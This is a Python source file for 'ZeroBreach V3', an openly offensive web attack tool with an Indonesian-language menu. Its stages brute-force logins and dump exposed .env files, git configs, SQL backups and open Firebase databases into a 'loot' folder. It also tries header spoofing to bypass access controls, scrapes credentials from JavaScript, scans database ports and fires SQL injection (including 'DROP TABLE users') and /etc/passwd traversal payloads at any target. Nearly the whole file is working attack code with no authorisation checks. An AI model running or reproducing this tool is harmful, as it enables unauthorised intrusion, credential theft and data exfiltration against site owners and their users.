#!/usr/bin/env python3
"""
ZeroBreach V3 — real recon + exploit tool.
Input: domain / endpoint. Output: loot + report. No gimmick.
"""

import json
import os
import random
import re
import socket
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

import requests
import urllib3
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT


MENU = f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════╗
║                    ZEROBREACH V3                         ║
║              real recon · exploit · dump                 ║
╚══════════════════════════════════════════════════════════╝{RESET}

{Y}Pilih mode:{RESET}
  {G}[1]{RESET} Full Auto      — semua stage (recon → dump)
  {G}[2]{RESET} Recon Only     — fingerprint + endpoint enum
  {G}[3]{RESET} Leak Check     — file sensitif (.env, .git, sql)
  {G}[4]{RESET} Bypass Test    — header bypass
  {G}[5]{RESET} Brute Force    — login brute pake wordlist
  {G}[6]{RESET} Firebase Check — cek misconfig Firebase
  {G}[7]{RESET} JS Mining      — cari credential di JS
  {G}[8]{RESET} Port Scan      — cek port DB terbuka
  {G}[9]{RESET} Endpoint Scan  — fokus 1 endpoint sedalam mungkin
  {G}[0]{RESET} Keluar
"""


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def pause():
    input(f"\n{C}[?]{RESET} ENTER buat lanjut...")


def log(kind, msg):
    tag = {
        "info": f"{C}[*]{RESET}",
        "ok":   f"{G}[+]{RESET}",
        "warn": f"{Y}[!]{RESET}",
        "err":  f"{R}[-]{RESET}",
        "crit": f"{M}[X]{RESET}",
        "dump": f"{G}{BOLD}[DUMP]{RESET}",
        "hit":  f"{G}{BOLD}[HIT]{RESET}",
    }[kind]
    print(f"{tag} {msg}")


def safe_name(s):
    return re.sub(r"[^a-zA-Z0-9._-]", "_", s)[:100]


def looks_like_data(text):
    """Cek apakah response beneran data (bukan HTML SPA)."""
    t = text.strip()
    tl = t.lower()
    if not t or len(t) < 20:
        return False

    # JSON object / array
    if t.startswith(("{", "[")):
        # cek valid JSON
        try:
            json.loads(t)
            return True
        except Exception:
            return False

    # .env / config style (KEY=value)
    if re.search(r"^[A-Z_]{3,}\s*=\s*\S", text, re.M):
        return True

    # log file (timestamp)
    if re.search(r"\[\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}", text):
        return True

    # db credentials
    if re.search(r"(DB_PASSWORD|DB_USER|APP_KEY|SECRET_KEY|API_KEY)\s*=", text):
        return True

    # SQL dump
    if re.search(r"(INSERT INTO|CREATE TABLE|DROP TABLE)", text, re.I):
        return True

    # git config
    if "[core]" in text and "repositoryformatversion" in text:
        return True

    # HTML → bukan data
    if "<!doctype html" in tl or "<html" in tl:
        return False

    return False


def get_kind(text):
    t = text.strip()
    if t.startswith(("{", "[")):
        return "json"
    if re.search(r"^[A-Z_]{3,}\s*=\s*\S", text, re.M):
        return "env"
    if re.search(r"\[\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}", text):
        return "log"
    if re.search(r"(INSERT INTO|CREATE TABLE)", text, re.I):
        return "sql"
    if "[core]" in text:
        return "gitconfig"
    return "txt"


PATHS = [
    "/api/users", "/api/admin", "/api/config", "/api/settings",
    "/api/keys", "/api/token", "/api/me", "/api/profile",
    "/api/users/count", "/api/servers", "/api/nodes",
    "/api/application/users", "/api/application/servers",
    "/api/application/nodes", "/api/application/locations",
    "/api/client/account", "/api/logs", "/api/db",
    "/api/database", "/api/backup", "/api/export",
    "/api/v1/users", "/api/v2/users",
    "/.env", "/.env.local", "/.env.backup",
    "/config.json", "/config.js", "/config.php",
    "/secrets.json", "/credentials.json",
    "/.git/config", "/.git/HEAD",
    "/storage/logs/laravel.log", "/error.log",
    "/phpinfo.php", "/info.php",
    "/db.sql", "/dump.sql", "/backup.sql",
    "/admin", "/admin/login", "/dashboard",
    "/swagger.json", "/openapi.json",
    "/graphql", "/graphiql",
]


BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]


LOGIN_PATHS = [
    "/api/login", "/api/auth/login", "/auth/login",
    "/login", "/admin/login", "/api/v1/login",
]


class ZeroBreach:
    def __init__(self, target, timeout=8, threads=20, outdir="loot",
                 users_file="users.txt", wordlist_file="wordlist.txt"):
        self.target = target.rstrip("/")
        if not self.target.startswith(("http://", "https://")):
            self.target = "http://" + self.target
        self.timeout = timeout
        self.threads = threads
        self.outdir = outdir
        os.makedirs(self.outdir, exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
        })

        self.hits = []
        self.loot = []
        self.users = self._load(users_file)
        self.wordlist = self._load(wordlist_file)
        self.found_creds = None

    def _load(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            return []

    def _req(self, method, path, headers=None, data=None, json_data=None,
             allow_redirects=True):
        url = path if path.startswith("http") else self.target + path
        try:
            return self.session.request(
                method=method, url=url, headers=headers,
                data=data, json=json_data,
                timeout=self.timeout, verify=False,
                allow_redirects=allow_redirects,
            )
        except Exception:
            return None

    def get(self, p, **kw): return self._req("GET", p, **kw)
    def post(self, p, **kw): return self._req("POST", p, **kw)

    def _record(self, sev, name, detail):
        self.hits.append((sev, name, detail))
        icon = {
            "crit": f"{M}[CRIT]{RESET}",
            "high": f"{R}[HIGH]{RESET}",
            "med":  f"{Y}[MED]{RESET}",
            "info": f"{C}[INFO]{RESET}",
        }[sev]
        print(f"{icon} {name}")
        print(f"        {W}{detail}{RESET}")

    def _save(self, name, body):
        kind = get_kind(body)
        fname = f"{safe_name(name)}.{kind}"
        fpath = os.path.join(self.outdir, fname)
        with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
            f.write(body)
        return fpath

    def _auto_dump(self, label, r):
        body = r.text
        if not looks_like_data(body):
            return False
        saved = self._save(label, body)
        kind = get_kind(body)
        size = len(body)
        log("dump", f"{label} [{kind}] {size}B -> {saved}")
        self.loot.append((label, kind, size, saved))
        self._record("crit", f"Dump: {label}", f"{kind} | {size}B | {saved}")
        return True

    # ============================================================
    # STAGE 1
    # ============================================================
    def stage_fingerprint(self):
        print(f"\n{C}=== STAGE 1: FINGERPRINT ==={RESET}")
        r = self.get("/")
        if not r:
            log("err", "Target nggak respon.")
            return False
        log("ok", f"Target hidup: HTTP {r.status_code}")
        log("info", f"Server: {r.headers.get('Server', '?')}")
        log("info", f"X-Powered-By: {r.headers.get('X-Powered-By', '?')}")

        body = r.text.lower()
        tech = []
        for kw, name in [
            ("wp-content", "WordPress"), ("laravel", "Laravel"),
            ("_next", "Next.js"), ("react", "React"),
            ("vue", "Vue"), ("pterodactyl", "Pterodactyl"),
            ("firebase", "Firebase"), ("cloudflare", "Cloudflare"),
        ]:
            if kw in body:
                tech.append(name)
        if tech:
            log("ok", f"Tech: {', '.join(sorted(set(tech)))}")
        return True

    # ============================================================
    # STAGE 2 — ENDPOINT ENUM (anti false positive)
    # ============================================================
    def stage_endpoints(self):
        print(f"\n{C}=== STAGE 2: ENDPOINT ENUM ({len(PATHS)} path) ==={RESET}")

        # baseline: ambil body dari random path yang pasti 404
        baseline_r = self.get(f"/{random_string(16)}", allow_redirects=False)
        baseline_body = baseline_r.text if baseline_r else ""
        baseline_len = len(baseline_body) if baseline_body else 0

        if baseline_len > 100:
            log("info", f"Baseline SPA terdeteksi ({baseline_len}B) — semua 200 sama bakal di-skip")

        def _check(p):
            return p, self.get(p, allow_redirects=False)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(_check, p) for p in PATHS]
            for f in as_completed(futs):
                res = f.result()
                if not res:
                    continue
                p, r = res
                if not r:
                    continue
                code = r.status_code

                if code == 200:
                    body = r.text
                    # anti false positive: kalau body = baseline, skip
                    if baseline_len > 100 and abs(len(body) - baseline_len) < 50:
                        if body[:100] == baseline_body[:100]:
                            continue

                    if not self._auto_dump(p, r):
                        if len(body) > 300:
                            self._record("med", f"Endpoint aktif: {p}",
                                         f"HTTP 200 | {len(body)}B")
                elif code == 401:
                    self._record("med", f"Butuh auth: {p}", "HTTP 401")
                elif code == 500:
                    self._record("high", f"Error 500: {p}", "potensi info leak")
                    if looks_like_data(r.text):
                        self._auto_dump(f"err{p}", r)

    # ============================================================
    # STAGE 3
    # ============================================================
    def stage_leaks(self):
        print(f"\n{C}=== STAGE 3: LEAK CHECK ==={RESET}")
        leaks = [
            "/.env", "/.env.local", "/.env.backup",
            "/config.json", "/config.js", "/config.php",
            "/secrets.json", "/credentials.json",
            "/.git/config", "/.git/HEAD",
            "/storage/logs/laravel.log",
            "/db.sql", "/dump.sql", "/backup.sql",
            "/backup.zip", "/phpinfo.php",
        ]
        for p in leaks:
            r = self.get(p, allow_redirects=False)
            if not r:
                continue
            if r.status_code == 200:
                if looks_like_data(r.text):
                    self._auto_dump(p, r)
                else:
                    log("info", f"{p} -> 200 tapi bukan data (SPA)")

    # ============================================================
    # STAGE 4
    # ============================================================
    def stage_bypass(self):
        print(f"\n{C}=== STAGE 4: HEADER BYPASS ==={RESET}")
        targets = ["/api/users", "/api/admin", "/api/config",
                   "/api/application/users", "/api/servers"]
        for t in targets:
            base = self.get(t, allow_redirects=False)
            if base and base.status_code == 200:
                continue
            for h in BYPASS_HEADERS:
                r = self.get(t, headers=h, allow_redirects=False)
                if r and r.status_code == 200 and looks_like_data(r.text):
                    log("crit", f"Bypass works: {t} via {list(h.keys())[0]}")
                    self._record("crit", f"Header bypass: {t}",
                                 f"{list(h.keys())[0]}={list(h.values())[0]}")
                    self._auto_dump(f"bypass{t}", r)
                    break

    # ============================================================
    # STAGE 5
    # ============================================================
    def stage_js(self):
        print(f"\n{C}=== STAGE 5: JS MINING ==={RESET}")
        r = self.get("/")
        if not r:
            return
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
        js_urls = [urljoin(self.target, u) for u in js_urls][:15]

        if not js_urls:
            log("info", "Nggak ada JS.")
            return

        cred_re = re.compile(
            r'(api[_-]?key|apikey|secret|token|bearer|auth|password)'
            r'["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            re.I,
        )
        ep_re = re.compile(r'["\'](/api/[a-zA-Z0-9/_-]{2,})["\']')

        for js in js_urls:
            jr = self.get(js)
            if not jr or jr.status_code != 200:
                continue
            for m in cred_re.finditer(jr.text):
                k, v = m.group(1), m.group(2)
                if v.lower() in ("undefined", "null", "none", ""):
                    continue
                log("crit", f"Cred di JS: {k}={v[:60]}")
                self._record("crit", "Credential di JS", f"{k}={v[:60]}")
                self._save(f"cred_{k}", f"{k}={v}")

            eps = list(set(ep_re.findall(jr.text)))[:20]
            for ep in eps:
                self._record("info", "Endpoint di JS", ep)

    # ============================================================
    # STAGE 6
    # ============================================================
    def stage_firebase(self):
        print(f"\n{C}=== STAGE 6: FIREBASE CHECK ==={RESET}")
        r = self.get("/")
        if not r:
            return
        project = None
        m = re.search(r'"projectId"\s*:\s*"([^"]+)"', r.text)
        if m:
            project = m.group(1)
        if not project:
            log("info", "Nggak ketemu Firebase config.")
            return
        log("info", f"Firebase project: {project}")
        for u in [
            f"https://{project}.firebaseio.com/.json",
            f"https://{project}-default-rtdb.firebaseio.com/.json",
        ]:
            try:
                rr = requests.get(u, timeout=self.timeout, verify=False)
                if rr.status_code == 200 and looks_like_data(rr.text):
                    log("crit", f"FIREBASE DUMP: {u}")
                    self._save(f"firebase_{project}", rr.text)
                    self._record("crit", "Firebase misconfig", f"{u}")
            except Exception:
                pass

    # ============================================================
    # STAGE 7 — BRUTE
    # ============================================================
    def _try_login(self, path, user, pw):
        for key_u, key_p in [("email", "password"), ("username", "password"),
                             ("user", "pass")]:
            try:
                r = self.post(
                    path,
                    json_data={key_u: user, key_p: pw},
                    headers={"Content-Type": "application/json"},
                    allow_redirects=False,
                )
                if r and r.status_code in (200, 201, 302):
                    body = r.text.lower()
                    if any(k in body for k in ("token", "success", "welcome", "dashboard")):
                        return (user, pw, r.text[:1000])
            except Exception:
                pass
        return None

    def stage_creds(self):
        print(f"\n{C}=== STAGE 7: BRUTE FORCE ==={RESET}")
        if not self.users or not self.wordlist:
            log("warn", "users.txt / wordlist.txt kosong.")
            return

        log("info", f"Users: {len(self.users)} | Passwords: {len(self.wordlist)}")

        for lp in LOGIN_PATHS:
            r = self.post(lp, json_data={})
            if not r or r.status_code == 404:
                continue
            log("info", f"Coba login di: {lp}")

            found = None
            with ThreadPoolExecutor(max_workers=5) as ex:
                futs = {}
                for u in self.users:
                    for p in self.wordlist:
                        futs[ex.submit(self._try_login, lp, u, p)] = (u, p)

                for f in as_completed(futs):
                    res = f.result()
                    if res:
                        found = res
                        log("hit", f"LOGIN BERHASIL: {lp} | {res[0]}:{res[1]}")
                        self.found_creds = (lp, res[0], res[1])
                        self._record("crit", f"Login berhasil: {lp}",
                                     f"{res[0]}:{res[1]}")
                        for ff in futs:
                            ff.cancel()
                        break
            if found:
                break

    # ============================================================
    # STAGE 8 — PORT SCAN
    # ============================================================
    def stage_ports(self):
        print(f"\n{C}=== STAGE 8: PORT SCAN ==={RESET}")
        host = urlparse(self.target).hostname
        if not host:
            return
        ports = {
            21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS",
            3306: "MySQL", 6379: "Redis", 27017: "MongoDB",
            8080: "Alt HTTP", 8443: "Alt HTTPS",
        }
        for port, name in ports.items():
            try:
                s = socket.create_connection((host, port), timeout=3)
                s.close()
                sev = "info" if port in (80, 443) else "high"
                self._record(sev, f"Port terbuka: {port}", name)
            except Exception:
                pass

    # ============================================================
    # STAGE 9 — ENDPOINT SCAN (FOKUS 1 URL)
    # ============================================================
    def stage_endpoint_scan(self):
        ep = self.target
        print(f"\n{C}=== STAGE 9: ENDPOINT SCAN ==={RESET}")
        print(f"{C}Target: {W}{ep}{RESET}\n")

        # 1. HTTP methods
        print(f"{C}[1/9] HTTP methods...{RESET}")
        for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
            r = self._req(method, ep, allow_redirects=False)
            if not r:
                continue
            code = r.status_code
            size = len(r.text)
            sev = "info"
            if code in (200, 201) and method != "GET":
                sev = "high"
            elif code in (401, 403):
                sev = "med"
            self._record(sev, f"{method} {ep}", f"HTTP {code} | {size}B")

        # 2. Header bypass
        print(f"\n{C}[2/9] Header bypass...{RESET}")
        hit_bypass = False
        for h in BYPASS_HEADERS:
            r = self._req("GET", ep, headers=h, allow_redirects=False)
            if r and r.status_code == 200 and looks_like_data(r.text):
                self._record("crit", f"Bypass works: {ep}",
                             f"{list(h.keys())[0]}={list(h.values())[0]}")
                self._auto_dump(f"bypass_{list(h.keys())[0]}", r)
                hit_bypass = True
        if not hit_bypass:
            log("info", "Nggak ada header bypass yang tembus.")

        # 3. Parameter tampering
        print(f"\n{C}[3/9] Parameter tampering...{RESET}")
        base = ep.split("?")[0].rstrip("/")
        params = [
            "?id=1", "?id=0", "?id=-1", "?id=99999999",
            "?admin=1", "?debug=1", "?test=1",
            "?user_id=1", "?account_id=1",
            "?format=json", "?output=json",
        ]
        for param in params:
            r = self._req("GET", base + param, allow_redirects=False)
            if not r:
                continue
            if r.status_code == 200 and looks_like_data(r.text):
                if len(r.text) > 50:
                    self._record("high", f"Param dump: {param}", f"{len(r.text)}B")
                    self._auto_dump(f"param_{safe_name(param)}", r)
            if r.status_code == 500:
                self._record("high", f"Error 500: {param}", "crash")

        # 4. SQL injection
        print(f"\n{C}[4/9] SQL injection test...{RESET}")
        sqli = ["'", "\"", "' OR '1'='1", "' OR 1=1--",
                "1' AND SLEEP(3)--", "1 UNION SELECT NULL--",
                "%27", "1;DROP TABLE users--"]
        for pl in sqli:
            test_url = base + f"?id={pl}"
            start = time.time()
            r = self._req("GET", test_url, allow_redirects=False)
            elapsed = time.time() - start
            if not r:
                continue
            if r.status_code == 500:
                self._record("high", f"SQLi suspect: {pl}", "HTTP 500")
            if elapsed > 2.5:
                self._record("crit", f"Time-based SQLi: {pl}", f"delay {elapsed:.1f}s")
            if "sql" in r.text.lower() or "syntax" in r.text.lower():
                self._record("crit", f"SQL error leak: {pl}", "error di response")

        # 5. Path traversal
        print(f"\n{C}[5/9] Path traversal...{RESET}")
        for tr in ["../../etc/passwd", "..%2f..%2fetc%2fpasswd",
                   "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]:
            r = self._req("GET", base + f"?file={tr}", allow_redirects=False)
            if r and "root:x:" in r.text:
                self._record("crit", f"Path traversal: {tr}", "etc/passwd leak")
                self._auto_dump("traversal_passwd", r)

        # 6. CORS
        print(f"\n{C}[6/9] CORS check...{RESET}")
        r = self._req("GET", ep, headers={"Origin": "https://evil.com"})
        if r:
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                self._record("med", "CORS wildcard", f"ACAO: {acao}")
            elif "evil.com" in acao:
                self._record("high", "CORS reflects origin", f"ACAO: {acao}")
            if acao and acac.lower() == "true":
                self._record("high", "CORS + credentials", "kombinasi bahaya")

        # 7. Response body
        print(f"\n{C}[7/9] Response body analisa...{RESET}")
        r = self._req("GET", ep)
        if r:
            body = r.text
            kind = get_kind(body)
            self._record("info", "Response kind", f"{kind} | {len(body)}B")
            m = re.search(r'["\'](token|api[_-]?key|secret)["\']\s*:\s*["\']([^"\']+)["\']',
                          body, re.I)
            if m:
                self._record("crit", "Credential di response",
                             f"{m.group(1)}={m.group(2)[:60]}")
            if looks_like_data(body):
                self._auto_dump("endpoint_body", r)

        # 8. Rate limit
        print(f"\n{C}[8/9] Rate limit check (20 req)...{RESET}")
        codes = []
        for i in range(20):
            r = self._req("GET", ep, allow_redirects=False)
            if r:
                codes.append(r.status_code)
        if 429 in codes:
            self._record("info", "Rate limit aktif",
                         f"429 di req #{codes.index(429)+1}")
        else:
            self._record("med", "No rate limit", "20 req tanpa 429")

        # 9. Auth check
        print(f"\n{C}[9/9] Auth check...{RESET}")
        r = self._req("GET", ep, allow_redirects=False)
        if r:
            if r.status_code == 200:
                self._record("crit", "Endpoint TANPA AUTH",
                             f"HTTP 200 | {len(r.text)}B")
                if looks_like_data(r.text):
                    self._auto_dump("no_auth", r)
            elif r.status_code == 401:
                self._record("info", "Endpoint butuh auth", "HTTP 401")
            elif r.status_code == 403:
                self._record("info", "Endpoint forbidden", "HTTP 403")

        print(f"\n{G}[+] Endpoint scan selesai.{RESET}")

    # ============================================================
    # REPORT
    # ============================================================
    def report(self):
        print()
        print(f"{C}{'=' * 62}{RESET}")
        print(f"{C}{BOLD}  REPORT — {self.target}{RESET}")
        print(f"{C}{'=' * 62}{RESET}")

        counts = {"crit": 0, "high": 0, "med": 0, "info": 0}
        for s, _, _ in self.hits:
            counts[s] = counts.get(s, 0) + 1

        print(f"  {M}CRIT: {counts['crit']}{RESET}  "
              f"{R}HIGH: {counts['high']}{RESET}  "
              f"{Y}MED: {counts['med']}{RESET}  "
              f"{C}INFO: {counts['info']}{RESET}")
        print(f"  {G}Files dumped: {len(self.loot)}{RESET}\n")

        order = {"crit": 0, "high": 1, "med": 2, "info": 3}
        for sev, name, detail in sorted(self.hits, key=lambda x: order[x[0]]):
            icon = {
                "crit": f"{M}[CRIT]{RESET}",
                "high": f"{R}[HIGH]{RESET}",
                "med":  f"{Y}[MED]{RESET}",
                "info": f"{C}[INFO]{RESET}",
            }[sev]
            print(f"{icon} {name}")
            print(f"        {W}{detail}{RESET}")

        print()
        print(f"{G}[+] Loot: {self.outdir}/")
        print(f"{G}[+] Total file dumped: {len(self.loot)}")

        try:
            with open("zerobreach_report.json", "w") as f:
                json.dump({
                    "target": self.target,
                    "creds_found": self.found_creds,
                    "hits": self.hits,
                    "loot": [{"label": l, "kind": k, "size": s, "file": fp}
                             for l, k, s, fp in self.loot],
                }, f, indent=2)
            print(f"{G}[+] Report: zerobreach_report.json{RESET}")
        except Exception:
            pass

    # ============================================================
    # RUNNER
    # ============================================================
    def run(self, stages="full"):
        if stages == "full":
            if not self.stage_fingerprint():
                return
            self.stage_endpoints()
            self.stage_leaks()
            self.stage_bypass()
            self.stage_js()
            self.stage_firebase()
            self.stage_creds()
            self.stage_ports()
        elif stages == "recon":
            if not self.stage_fingerprint():
                return
            self.stage_endpoints()
        elif stages == "leak":
            self.stage_leaks()
        elif stages == "bypass":
            self.stage_bypass()
        elif stages == "brute":
            self.stage_creds()
        elif stages == "firebase":
            self.stage_firebase()
        elif stages == "js":
            self.stage_js()
        elif stages == "ports":
            self.stage_ports()
        elif stages == "endpoint":
            self.stage_endpoint_scan()
        self.report()


def random_string(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ============================================================
# MAIN
# ============================================================
def get_target():
    t = input(f"{C}[?]{RESET} URL target: ").strip()
    if not t:
        log("err", "URL kosong.")
        return None
    return t


def main():
    clear()
    while True:
        print(MENU)
        pilihan = input(f"{C}[?]{RESET} Pilih: ").strip()

        if pilihan == "0":
            print(f"\n{Y}[!] Keluar. 6767.{RESET}")
            sys.exit(0)

        if pilihan not in [str(i) for i in range(1, 10)]:
            clear()
            log("err", "Pilihan nggak valid.")
            time.sleep(1)
            clear()
            continue

        target = get_target()
        if not target:
            time.sleep(1)
            clear()
            continue

        outdir = input(f"{C}[?]{RESET} Outdir (default loot): ").strip() or "loot"
        threads_in = input(f"{C}[?]{RESET} Threads (default 20): ").strip() or "20"
        try:
            threads = int(threads_in)
        except ValueError:
            threads = 20

        clear()
        print(f"{G}{BOLD}=== ZeroBreach V3 ==={RESET}")
        print(f"{C}Target : {W}{target}{RESET}")
        print(f"{C}Outdir : {W}{outdir}{RESET}")
        print(f"{C}Threads: {W}{threads}{RESET}\n")

        tool = ZeroBreach(target, threads=threads, outdir=outdir)

        stages = {
            "1": "full",
            "2": "recon",
            "3": "leak",
            "4": "bypass",
            "5": "brute",
            "6": "firebase",
            "7": "js",
            "8": "ports",
            "9": "endpoint",
        }[pilihan]

        try:
            tool.run(stages=stages)
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Interrupted.{RESET}")

        pause()
        clear()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Keluar.{RESET}")
        sys.exit(0)
